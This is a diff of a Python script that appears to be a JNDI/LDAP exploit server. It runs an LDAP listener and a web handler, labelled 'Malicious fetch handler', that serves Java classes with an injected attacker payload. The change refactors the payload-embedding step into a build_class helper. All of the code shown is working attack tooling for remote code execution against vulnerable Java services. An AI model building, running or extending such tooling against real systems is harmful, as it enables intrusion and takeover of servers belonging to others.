@@ -167,6 +167,10 @@ def ldap():
     with socketserver.TCPServer((LHOST, LDAP_PORT), LDAPHandler) as server:
         server.serve_forever()
 
+def build_class(cls, payload):
+    tag = b"\x01" + struct.pack("!H", len(payload))
+    return cls[0] + tag + payload.encode() + cls[1]
+
 class WebHandler(http.server.BaseHTTPRequestHandler):
     """
     Malicious fetch handler.
@@ -183,8 +187,7 @@ class WebHandler(http.server.BaseHTTPRequestHandler):
             java_class = JAVA_CLASSES["Any"]
 
         if isinstance(java_class, tuple):
-            tag = b"\x01" + struct.pack("!H", len(PAYLOAD))
-            output = java_class[0] + tag + PAYLOAD.encode() + java_class[1]
+            output = build_class(java_class, PAYLOAD)
         else:
             output = java_class
 
